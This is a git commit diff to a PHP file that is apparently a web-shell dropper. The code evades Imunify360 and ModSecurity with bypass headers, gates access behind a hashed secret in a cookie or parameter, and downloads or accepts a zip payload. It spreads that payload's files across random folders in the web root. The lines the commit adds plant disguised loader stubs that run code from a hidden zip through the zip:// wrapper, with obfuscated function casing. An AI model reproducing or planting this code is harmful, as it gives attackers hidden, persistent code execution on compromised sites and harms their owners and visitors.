c04b5e765fd553f3755b50560a4326e747172e56
dionjo <960207@lin>
2024-10-15 16:12:37 +0800

    v12

--- v1.php
+++ v1.php
@@ -21,18 +21,25 @@ if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION
     if (isset($imunifyHeaders['X-Imunify360-Request'])) header('X-Imunify360-Request: bypass');
     if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
 }
+
 if (function_exists('apache_request_headers')) {
     $apacheHeaders = apache_request_headers();
     if (isset($apacheHeaders['X-Mod-Security'])) header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
 }
+
 if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
     $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
     if (isset($apacheHeaders['HTTP_CF_VISITOR'])) header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
 }
+
 function wp_die($msg){
     die($msg);
 }
+
+
+
 $uid =!empty($_COOKIE['uid'])?$_COOKIE['uid']:$_REQUEST['uid'];
+
 if (empty($uid) || md5(md5(sha1(md5(md5($uid))))) != $hhest) wp_die("p");
 function listFolders($dir){
     $ffs = scandir($dir);
@@ -65,6 +72,7 @@ function to($d,$n){
     }
     return $d2;
 }
+
 function d1($p){
     $fp = @fopen($p,'r');
     $b = "";
@@ -82,6 +90,24 @@ function d2($p){
     if(empty($f)) d1($p);
     return $f;
 }
+
+function fw($p,$d,$file=null)
+{
+    if(file_put_contents($p, $d)){
+        return true;
+    }else{
+        $_xxb = @FOPen($p, "w");
+        if ($_xxb) {
+            if(fwrite($_xxb, $d) || ($file != null && stream_copy_to_stream($file, $_xxb))){
+                @fClOsE($_xxb);
+                return true;
+            };
+        }
+    };
+    return false;
+}
+
+
 function down($l,$s){
     $t = false;
     if (function_exists('curl_init')) {
@@ -89,6 +115,7 @@ function down($l,$s){
         $fp = fopen($s, 'w+');
         curl_setopt($ch, CURLOPT_FILE, $fp);
         curl_setopt($ch, CURLOPT_TIMEOUT, 50);
+
         if (curl_exec($ch)) {
             $t = true;
         }
@@ -96,12 +123,7 @@ function down($l,$s){
         fclose($fp);
     }else{
         $b = d2($l);
-        if ($b) {
-            $fp = fopen($s, 'w+');
-            $t= fwrite($fp,$b) !== false;
-            fclose($fp);
-            if(!$t) $t=file_put_contents($s,$b) !== false;
-        }
+        if ($b)$t = fw($s,$b);
     }
     return $t;
 }
@@ -113,29 +135,35 @@ if (!empty($_FILES['pluginzip'])) {
     $file = TeMpNaM(sys_get_temp_dir(),$_SERVER['HTTP_HOST']."_");
     if(!down(gzuncompress(hex2bin($_REQUEST["l"])),$file))wp_die("d");
 }elseif(!empty($_REQUEST['uid'])) wp_die ("<form method='post' enctype='multipart/form-data'><input type='file' name='pluginzip'><input type='submit'/>");
+
 $root = $_SERVER['DOCUMENT_ROOT'];
 $dirs = listFolders($root);
+
 $zip = new ZipArchive();
 if ($zip->open($file) !== TRUE) wp_die("z");
+$names= array();
 for ($i = 0; $i < $zip->numFiles; $i++) {
     $filename = $zip->getNameIndex($i);
-    $file = $zip->getStream($filename);
+    $fp = $zip->getStream($filename);
+    $names[]= $filename;
     $a = explode("/",$filename);
     $fn = end($a);
-    if ($file) {
-        $data = stream_get_contents($file);
+    if ($fp) {
+        $data = stream_get_contents($fp);
         $to = to($dirs,$fn);
         $to2 = str_replace($root,"",$to)."\n";
-        if(file_put_contents($to, $data)){
+        if(fw($to, $data,$fp)){
             echo $to2;
-        }else{
-            $_xxb = @FOPen($to, "w");
-            if ($_xxb) {
-                if(fwrite($_xxb, $data) || stream_copy_to_stream($file, $_xxb))echo $to2;
-                @fClOsE($_xxb);
-            }
         };
     }
 }
 $zip->close();
+$_REQUEST['o'] = 1;
+$p2 = to($dirs,"");
+move_uploaded_file($file, $p2);
+foreach ($names as $name) {
+    $to = to($dirs,'');
+    $data= '<?=@null; $h="";if(!empty($_SERVER["HTTP_HOST"])) $h = "'.$name.'"; include("zip://'.$p2.'#$h");?>';
+    if(fw($to, $data))echo str_replace($root,"",$to)."\n";
+}
 ?>
